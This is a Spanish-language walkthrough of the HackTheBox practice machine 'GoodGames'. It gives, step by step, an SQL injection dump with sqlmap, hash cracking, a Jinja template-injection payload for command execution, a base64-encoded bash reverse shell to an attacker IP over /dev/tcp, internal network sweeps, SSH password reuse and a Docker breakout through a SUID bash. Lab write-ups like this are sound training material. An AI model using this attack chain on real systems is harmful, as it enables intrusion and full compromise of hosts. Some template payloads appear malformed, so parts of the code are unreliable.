# Máquina "GoodGames" de HackTheBox

## Características

- Linux
- Fácil
- SQLI (Error Based)
- Hash Cracking Weak Algorithms Password Reuse
- Server Side Template Injection (SSTI)
- Docker Breakout (Privilege Escalation) [PIVOTING]

## Útil en

- eJPT
- eWPT
- eCPPTv2
- OSCP (Escalada)

**IP:** 10.10.11.130

## Escaneo de puertos

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.130
```

**Resultado:**
```
PORT   STATE SERVICE
80/tcp open  http
```

```bash
nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.11.130
```

**Resultado:**
```
PORT   STATE SERVICE  VERSION
80/tcp open  ssl/http Werkzeug/2.0.2 Python/3.9.2
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-title: GoodGames | Community and Store
```

## Reconocimiento web

No vemos nada interesante más que el puerto 80, así que visitamos la página web. Pero es solo una página estática donde estos enlaces no conducen a ninguna parte, incluida la tienda.

![Página web principal](/secciones/posts/imagenes/goodgames/web1.png)

![Página web 2](/secciones/posts/imagenes/goodgames/web3.webp)

![Página web 3](/secciones/posts/imagenes/goodgames/web4.webp)

Así que procedemos a crearnos un usuario:

![Registro de usuario](/secciones/posts/imagenes/goodgames/reg1.webp)

![Registro exitoso](/secciones/posts/imagenes/goodgames/succes.webp)

## Detección de SQL Injection

Con el restablecimiento de contraseña, intenté ver si estaba tomando un nombre de usuario en los parámetros, esto usando Burp Suite, y no lo hacía. Así que salimos y probamos algunas inyecciones SQL simples en el login.

![SQL Injection en login](/secciones/posts/imagenes/goodgames/sqlog.webp)

Y no pudimos, así que intentaremos con SQLMap:

![SQLMap ejecución](/secciones/posts/imagenes/goodgames/sqlmap.webp)

![SQLMap resultado 1](/secciones/posts/imagenes/goodgames/sqli1.webp)

![SQLMap resultado 2](/secciones/posts/imagenes/goodgames/sqli2.webp)

![SQLMap resultado 3](/secciones/posts/imagenes/goodgames/sqli3.webp)

Es vulnerable a SQL injection basado en tiempo. Buscaremos a los usuarios:

```bash
sqlmap -r sql --batch -D principal -T usuario --dump
```

Podemos ver nombre y hash del usuario administrador. Después de pasarlo por CrackStation tenemos:

**Contraseña:** `superadministrator`

## Acceso al panel de administración

Después de iniciar sesión en la página con credenciales de admin, podemos ver otras opciones que nos llevarán a `internal-administration.goodgames.htb`, que agregaremos al `/etc/hosts`:

```bash
echo "10.10.11.130 goodgames.htb internal-administration.goodgames.htb" >> /etc/hosts
```

![Panel de administración](/secciones/posts/imagenes/goodgames/web6.webp)

## Detección de SSTI

Ahora vemos una página de Flask Volt. Es solo una plantilla en GitHub para la página de inicio de sesión de aplicaciones Flask y, al ser una aplicación Flask, podría ser vulnerable a uno de los ataques comunes: la inyección de plantilla del lado del servidor (SSTI).

Probamos e ingresamos con credenciales por defecto.

La página de configuración tiene un campo de entrada para el nombre de usuario, por lo que se prueba con la carga útil ` {7*7} `. Debería devolver el resultado 49 en el nombre de la tarjeta de usuario.

![SSTI test](/secciones/posts/imagenes/goodgames/target1.webp)

## Identificación del motor de plantillas

Ahora necesitamos encontrar qué motor de plantilla está usando. Para hacerlo, podemos verificar con la carga útil ` {7*'7'} `:

- Si devuelve el resultado 49, eso significa que está usando Twig
- Si devuelve 7777777, entonces está usando Jinja

Es Jinja. Ahora necesitamos buscar la carga útil para ejecutar el comando:

```python
 { self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() } 
```

## Obtención de shell reverso

Con esta carga útil, admite comandos de shell. Esta aplicación está alojada en un contenedor Docker. Usando bash shell reverso, podemos obtener un shell convirtiendo primero la carga útil del shell reverso a base64:

```bash
echo "bash -i >& /dev/tcp/10.10.14.77/2222 0>&1" | base64
```

**Payload final:**
```python
'{'{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Ny8yMjIyIDA+JjEK" |base64 -d| bash').read() } '}'
```

## Reconocimiento del contenedor

Recibimos la reverse shell con netcat y lanzamos comandos de reconocimiento.

Al revisar las conexiones de red, verificamos que estamos en un contenedor. Lanzamos `df -h` para ver el espacio en disco:

```bash
df -h
```

Podemos ver un directorio `/home/augustus` de `/dev/sda1`. Como este usuario no existe en este contenedor Docker, probablemente se haya montado desde la máquina host.

Hay un archivo `.dockerenv` en la raíz del sistema de archivos. También hay algunas cosas más sutiles. Los permisos sobre archivos en `/home/augustus` muestran identificadores de usuario en lugar de nombres:

```bash
root@3a453ab39d3d:/home/augustus# ls -la
total 24
drwxr-xr-x 2 1000 1000 4096 Dec  2 23:51 .
drwxr-xr-x 1 root root 4096 Nov  5 15:23 ..
lrwxrwxrwx 1 root root    9 Nov  3 10:16 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Oct 19 11:16 .bash_logout
-rw-r--r-- 1 1000 1000 3526 Oct 19 11:16 .bashrc
-rw-r--r-- 1 1000 1000  807 Oct 19 11:16 .profile
-rw-r----- 1 root 1000   33 Feb 22 02:41 user.txt
```

No hay ningún usuario augustus o usuario 1000 en `/etc/passwd`:

```bash
root@3a453ab39d3d:~# cat /etc/passwd | grep 1000
root@3a453ab39d3d:~# cat /etc/passwd | grep augustus
```

Eso es una indicación de que este directorio de inicio está montado en el contenedor desde el host. El comando `mount` lo confirma:

```bash
root@3a453ab39d3d:~# mount | grep augustus
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
```

## Reconocimiento de red interna

Hacemos un escaneo de puertos internos:

```bash
root@3a453ab39d3d:~# for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
22 open
80 open
```

Un rápido barrido de ping de la clase C muestra solo otro host:

```bash
root@3a453ab39d3d:~# for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.124 ms
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.087 ms
```

## Pivoting al host

Probamos reutilizar contraseñas y funciona para augustus:

```bash
root@3a453ab39d3d:~# ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$
```

Estamos en la IP de la máquina donde está montada la web:

```bash
augustus@GoodGames:~$ hostname -I
10.10.11.130 172.19.0.1 172.17.0.1 dead:beef::250:56ff:feb9:809b
```

Docker está en la lista de procesos y coincide con lo que sospechaba desde el punto de vista del contenedor:

```bash
augustus@GoodGames:~$ ps auxww | grep docker
root       908  0.0  2.1 1457176 86204 ?       Ssl  02:40   0:09 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root      1246  0.0  0.2 1222636 9616 ?        Sl   02:40   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8085 -container-ip 172.19.0.2 -container-port 8085
```

## Escalada de privilegios mediante Docker Breakout

El directorio de inicio es el mismo que el del contenedor. Los tamaños y tiempos de los archivos son exactamente los mismos.

Si creo un archivo en el host:

```bash
augustus@GoodGames:~$ ls -l from_container
-rw-r--r-- 1 root root 0 Feb 22 15:16 from_container
```

Curiosamente, el archivo creado desde el contenedor es propiedad de root y el host lo trata como si fuera root.

Copiamos `/bin/bash` en el directorio de augustus:

```bash
augustus@GoodGames:~$ cp /bin/bash .
```

Luego, en el contenedor, cambio el propietario a root y configuro los permisos para que sean SUID:

```bash
root@3a453ab39d3d:/home/augustus# ls -l bash
-rwxr-xr-x 1 1000 1000 1234376 Feb 22 15:25 bash
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod 4777 bash
root@3a453ab39d3d:/home/augustus# ls -l bash
-rwsrwxrwx 1 root root 1234376 Feb 22 15:25 bash
```

Ahora ejecutamos:

```bash
augustus@GoodGames:~$ ./bash -p
bash-5.1# 
```

¡Y somos root!

## Nota 

Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes. Esto se debe a que en algunas de las máquinas que realicé, no tomé los apuntes o no tomé capturas de pantalla, así que he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí. También, si encuentras faltas de ortografía o cualquier error, puedes contactarme a mi correo.

